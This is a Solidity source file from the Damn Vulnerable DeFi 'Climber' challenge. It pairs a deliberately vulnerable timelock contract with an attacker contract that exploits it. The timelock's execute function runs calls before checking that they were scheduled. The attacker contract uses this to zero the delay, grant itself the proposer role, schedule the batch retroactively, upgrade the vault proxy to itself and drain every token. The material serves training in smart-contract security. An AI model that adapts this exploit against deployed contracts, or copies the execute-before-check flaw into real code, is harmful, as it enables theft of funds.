// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./ClimberTimelockBase.sol";
import {ADMIN_ROLE, PROPOSER_ROLE, MAX_TARGETS, MIN_TARGETS, MAX_DELAY} from "./ClimberConstants.sol";
import {
    InvalidTargetsCount,
    InvalidDataElementsCount,
    InvalidValuesCount,
    OperationAlreadyKnown,
    NotReadyForExecution,
    CallerNotTimelock,
    NewDelayAboveMax
} from "./ClimberErrors.sol";

/**
 * @title ClimberTimelock
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract ClimberTimelock is ClimberTimelockBase {
    using Address for address;

    /**
     * @notice Initial setup for roles and timelock delay.
     * @param admin address of the account that will hold the ADMIN_ROLE role
     * @param proposer address of the account that will hold the PROPOSER_ROLE role
     */
    constructor(address admin, address proposer) {
        _setRoleAdmin(ADMIN_ROLE, ADMIN_ROLE);
        _setRoleAdmin(PROPOSER_ROLE, ADMIN_ROLE);
        _setupRole(ADMIN_ROLE, admin);
        _setupRole(ADMIN_ROLE, address(this)); // self administration
        _setupRole(PROPOSER_ROLE, proposer);

        delay = 1 hours;
    }

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external onlyRole(PROPOSER_ROLE) {
        if (targets.length == MIN_TARGETS || targets.length >= MAX_TARGETS) {
            revert InvalidTargetsCount();
        }

        if (targets.length != values.length) {
            revert InvalidValuesCount();
        }

        if (targets.length != dataElements.length) {
            revert InvalidDataElementsCount();
        }

        bytes32 id = getOperationId(targets, values, dataElements, salt);

        if (getOperationState(id) != OperationState.Unknown) {
            revert OperationAlreadyKnown(id);
        }

        operations[id].readyAtTimestamp = uint64(block.timestamp) + delay;
        operations[id].known = true;
    }

    /**
     * Anyone can execute what's been scheduled via `schedule`
     */
    function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
        external
        payable
    {
        if (targets.length <= MIN_TARGETS) {
            revert InvalidTargetsCount();
        }

        if (targets.length != values.length) {
            revert InvalidValuesCount();
        }

        if (targets.length != dataElements.length) {
            revert InvalidDataElementsCount();
        }

        bytes32 id = getOperationId(targets, values, dataElements, salt);

        for (uint8 i = 0; i < targets.length;) {
            targets[i].functionCallWithValue(dataElements[i], values[i]);
            unchecked {
                ++i;
            }
        }

        if (getOperationState(id) != OperationState.ReadyForExecution) {
            revert NotReadyForExecution(id);
        }

        operations[id].executed = true;
    }

    function updateDelay(uint64 newDelay) external {
        if (msg.sender != address(this)) {
            revert CallerNotTimelock();
        }

        if (newDelay > MAX_DELAY) {
            revert NewDelayAboveMax();
        }

        delay = newDelay;
    }
}

import "./ClimberVault.sol";
import "../DamnValuableToken.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract ClimberAttacker is UUPSUpgradeable {
    ClimberTimelock timelock;
    ClimberVault vault;
    DamnValuableToken private immutable token;
    address private immutable attacker;
    
    address[] targets = new address[](5);
    uint256[] values = new uint256[](5);
    bytes[] dataElements = new bytes[](5);
    
    constructor(address _vault, address _timelock, address _token) {
        vault = ClimberVault(_vault);
        timelock = ClimberTimelock(payable(_timelock));
        token = DamnValuableToken(_token);
        attacker = msg.sender;
    }

    function attack() external {
        // Step 1: update delay
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, uint64(0));


        // Step 2: grant proposal role to our attacker contract (as ClimberTimelock is admin and can grant PROPOSER_ROLE)
        // PROPOSER_ROLE = 0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSelector(AccessControl.grantRole.selector, 0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1, address(this));
        
        // Step 3 : schedule the operation, to make the future check OK
        targets[2] = address(this);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSelector(this.schedule.selector);


        // Step 4 : upgrade proxy to point to our contract
        targets[3] = address(vault);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSelector(UUPSUpgradeable.upgradeTo.selector, address(this));


        // Step 5 : call the transferAllFunds function from the proxy
        uint256 balance = token.balanceOf(address(vault));
        targets[4] = address(vault);
        values[4] = 0;
        dataElements[4] = abi.encodeWithSelector(this.transferAllFunds.selector, attacker, balance);

        timelock.execute(targets, values, dataElements, "0x123456");
    }

    function schedule() external {
        timelock.schedule(targets, values, dataElements, "0x123456");
    }

    function transferAllFunds(address _attacker, uint256 amount) external {
        token.transfer(_attacker, amount);
    }

    function _authorizeUpgrade(address newImplementation) internal override {}

}